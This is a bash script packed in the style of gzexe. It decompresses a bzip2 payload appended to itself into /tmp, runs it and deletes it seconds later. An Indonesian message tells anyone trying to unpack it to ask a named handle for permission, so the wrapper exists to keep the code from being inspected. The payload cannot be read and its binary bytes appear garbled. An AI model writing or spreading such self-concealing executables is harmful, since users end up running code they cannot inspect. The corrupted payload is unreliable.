#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY����  ���EP}���>nݎ��ߪ    @��CP�Q���=@h    �	DFT�����d=M  @�  F�=@ �424�4b 0�"54��=&���'�S�ɧ���=M�3S�2z�@"^�!ñ��ZzS��$NS��� T�a�Q1B ���NI|.��[��o�T=���Q�+��R���+qeBA4P�Sp���8E3�8�[H�˗���ł��+�!�Ă(�/���79�L��㨷i�>��kY�槻�H{��6���儐�����tĦ$$0�JL��d�}<�rڙ&I��u���=l�`��ٲX��@�xg/���SEO�j$�F\L��>�����Y�F�ut�m�5 �]u��,g��������ӮHP�{��z^�7f���a��&
�bP��9ĳK,^��:�Ou	RN>��A.w����f�=Eַ﫶��n(0��FV�#`f� g�ŏ%�G �Y1v�Ư�P�n+�g"z�0*J�3V�/��#)G<�,�QlÇ������vlkG��H�i����-K��B)=�2�~.'R-���I��]i	.��rE8P�����